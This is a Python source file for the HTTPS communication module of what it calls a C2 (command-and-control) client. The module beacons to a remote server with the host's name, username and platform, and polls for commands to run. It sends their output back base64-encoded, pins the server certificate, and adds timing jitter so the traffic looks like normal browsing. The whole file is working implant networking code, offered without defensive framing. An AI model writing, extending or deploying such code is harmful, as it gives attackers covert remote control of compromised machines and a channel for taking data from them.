#!/usr/bin/env python3
"""
HTTPS Client Module with Certificate Pinning
Handles communication with C2 server via HTTPS with certificate pinning
"""

import base64
import json
import random
import time
import urllib.request
import urllib.error
import ssl
import socket
import hashlib
import platform


class HTTPSClient:
    """HTTPS client with certificate pinning for C2 communication."""
    
    def __init__(self, base_url, session_id=None, cert_fingerprint=None):
        """
        Initialize HTTPS client.
        
        Args:
            base_url: C2 server base URL (e.g., "https://example.com")
            session_id: Existing session ID (for reconnection)
            cert_fingerprint: Expected certificate SHA256 fingerprint for pinning
        """
        # Ensure base_url doesn't end with /
        self.base_url = base_url.rstrip('/')
        self.session_id = session_id or self._generate_session_id()
        self.cert_fingerprint = cert_fingerprint
        self.base_delay = 30  # Base polling interval in seconds
        self.is_windows = platform.system() == 'Windows'
        
    def _debug_print(self, message):
        """Print debug message only on Windows."""
        # Debug statements disabled
        pass
        
    def _generate_session_id(self):
        """Generate cryptographically random session ID."""
        import secrets
        return base64.urlsafe_b64encode(secrets.token_bytes(16)).decode('ascii').rstrip('=')
    
    def _make_https_request(self, endpoint, data=None, method='GET'):
        """
        Make HTTPS request with certificate pinning.
        
        Args:
            endpoint: API endpoint (e.g., "/api/beacon")
            data: Request data (dict, will be JSON encoded)
            method: HTTP method
            
        Returns:
            dict: Response data or None on error
        """
        try:
            import socket
            from urllib.parse import urlparse
            
            url = f"{self.base_url}{endpoint}"
            self._debug_print(f"[*] Making HTTPS request to: {url}")
            parsed = urlparse(url)
            hostname = parsed.hostname
            port = parsed.port or 443
            self._debug_print(f"[*] Parsed - Hostname: {hostname}, Port: {port}")
            
            # Create SSL context
            # If certificate pinning is enabled, disable default verification (we verify manually)
            # Otherwise, use default verification
            if self.cert_fingerprint:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
            else:
                context = ssl.create_default_context()
            
            # Create request
            if data:
                data_bytes = json.dumps(data).encode('utf-8')
                req = urllib.request.Request(url, data=data_bytes, method=method)
                req.add_header('Content-Type', 'application/json')
            else:
                req = urllib.request.Request(url, method=method)
            
            req.add_header('User-Agent', 'Mozilla/5.0 (compatible; HTTPS Client)')
            req.add_header('X-Session-ID', self.session_id)
            
            # Verify certificate fingerprint before making request (if pinning enabled)
            if self.cert_fingerprint:
                self._debug_print(f"[*] Certificate pinning enabled, verifying fingerprint...")
                self._debug_print(f"[*] Expected fingerprint: {self.cert_fingerprint}")
                try:
                    verify_sock = socket.create_connection((hostname, port), timeout=10)
                    self._debug_print(f"[*] Socket connection established to {hostname}:{port}")
                    try:
                        with context.wrap_socket(verify_sock, server_hostname=hostname) as verify_ssock:
                            self._debug_print(f"[*] SSL handshake completed")
                            cert_der = verify_ssock.getpeercert(binary_form=True)
                            fingerprint = hashlib.sha256(cert_der).hexdigest()
                            self._debug_print(f"[*] Server certificate fingerprint: {fingerprint}")
                            if fingerprint.lower() != self.cert_fingerprint.lower():
                                self._debug_print(f"[!] Certificate fingerprint mismatch!")
                                return None  # Certificate mismatch
                            self._debug_print(f"[+] Certificate fingerprint verified")
                    except Exception as e:
                        self._debug_print(f"[!] SSL handshake failed: {e}")
                        import traceback
                        traceback.print_exc()
                        return None
                    finally:
                        # Close verification socket (we'll make a new connection for the request)
                        try:
                            if not verify_sock._closed:
                                verify_sock.close()
                        except:
                            pass
                except Exception as e:
                    self._debug_print(f"[!] Failed to create socket connection: {e}")
                    import traceback
                    traceback.print_exc()
                    return None
            
            # Make request (certificate already verified if pinning enabled)
            self._debug_print(f"[*] Making HTTP {method} request to {endpoint}...")
            try:
                with urllib.request.urlopen(req, timeout=10, context=context) as response:
                    self._debug_print(f"[+] HTTP request successful, status: {response.getcode()}")
                    response_data = json.loads(response.read().decode('utf-8'))
                    self._debug_print(f"[+] Response received: {response_data}")
                    return response_data
            except urllib.error.URLError as e:
                self._debug_print(f"[!] URLError during request: {e}")
                import traceback
                traceback.print_exc()
                return None
                
        except Exception as e:
            self._debug_print(f"[!] Exception in _make_https_request: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def send_response(self, response_data):
        """
        Send response to C2 server.
        
        Args:
            response_data: Response data (string or bytes)
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if isinstance(response_data, bytes):
                response_data = response_data.decode('utf-8', errors='ignore')
            
            # Encode response
            encoded = base64.urlsafe_b64encode(response_data.encode('utf-8')).decode('ascii')
            
            data = {
                'session_id': self.session_id,
                'response': encoded
            }
            
            result = self._make_https_request('/api/response', data=data, method='POST')
            return result is not None
            
        except Exception:
            return False
    
    def get_command(self, hostname=None, username=None, platform_info=None):
        """
        Poll C2 server for commands.
        
        Args:
            hostname: System hostname (optional, for first beacon)
            username: System username (optional, for first beacon)
            platform_info: Platform information (optional, for first beacon)
        
        Returns:
            Command string or None if no command available
        """
        try:
            self._debug_print(f"[*] Polling for commands (Session ID: {self.session_id[:16]}...)")
            data = {
                'session_id': self.session_id
            }
            
            # Include system info if provided (typically only on first beacon)
            if hostname:
                data['hostname'] = hostname
            if username:
                data['username'] = username
            if platform_info:
                data['platform'] = platform_info
            
            result = self._make_https_request('/api/beacon', data=data, method='POST')
            
            if result:
                self._debug_print(f"[+] Beacon response received: {result}")
                if result.get('command'):
                    self._debug_print(f"[+] Command received: {result['command']}")
                    return result['command']
                else:
                    self._debug_print(f"[*] No command in response")
            else:
                self._debug_print(f"[!] Beacon request returned None")
            
            return None
            
        except Exception as e:
            self._debug_print(f"[!] Exception in get_command: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def get_polling_delay(self):
        """
        Get polling delay with jitter to mimic normal HTTPS behavior.
        
        Returns:
            Delay in seconds
        """
        jitter = random.uniform(0.8, 1.2)  # ±20% jitter
        return int(self.base_delay * jitter)

